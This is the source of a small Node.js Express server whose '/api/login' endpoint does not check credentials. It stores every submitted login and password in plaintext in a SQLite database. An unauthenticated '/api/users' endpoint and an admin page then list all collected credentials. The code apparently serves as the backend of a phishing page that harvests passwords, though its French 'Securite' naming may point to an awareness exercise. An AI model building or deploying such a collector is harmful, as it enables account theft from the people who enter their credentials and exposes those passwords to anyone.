const express  = require('express');
const cors     = require('cors');
const Database = require('better-sqlite3');
const path     = require('path');

const app  = express();
const PORT = process.env.PORT || 3000;
const db   = new Database(path.join(__dirname, 'users.db'));

db.exec(`
  CREATE TABLE IF NOT EXISTS users (
    id       INTEGER PRIMARY KEY AUTOINCREMENT,
    login    TEXT NOT NULL,
    password TEXT NOT NULL,
    date     TEXT NOT NULL
  )
`);

const stmtInsert = db.prepare('INSERT INTO users (login, password, date) VALUES (?, ?, ?)');
const stmtAll    = db.prepare('SELECT * FROM users ORDER BY id DESC');
const stmtDelete = db.prepare('DELETE FROM users WHERE id = ?');

app.use(cors({ origin: [
  'rocketreport.me/Securite/',
  'https://rocketreport.me',
  'https://samych26.github.io'
  
] }));
app.use(express.json());
// ...existing code...

// Sert le frontend ET la page admin
app.use(express.static(path.join(__dirname, '../frontend')));
app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'admin/index.html')));
app.get('/admin/', (req, res) => res.sendFile(path.join(__dirname, 'admin/index.html')));

// Enregistre un utilisateur
app.post('/api/login', (req, res) => {
  const { login, password } = req.body;
  if (!login || !password) return res.status(400).json({ error: 'Champs manquants.' });
  stmtInsert.run(login, password, new Date().toISOString());
  res.json({ success: true });
});

// Récupère tous les utilisateurs
app.get('/api/users', (req, res) => {
  res.json(stmtAll.all());
});

// Supprime un utilisateur
app.delete('/api/users/:id', (req, res) => {
  stmtDelete.run(req.params.id);
  res.json({ success: true });
});

app.listen(PORT, () => {
  console.log(`Frontend → https://securite-eah6.onrender.com`);
  console.log(`Admin    → https://securite-eah6.onrender.com/admin`);
});


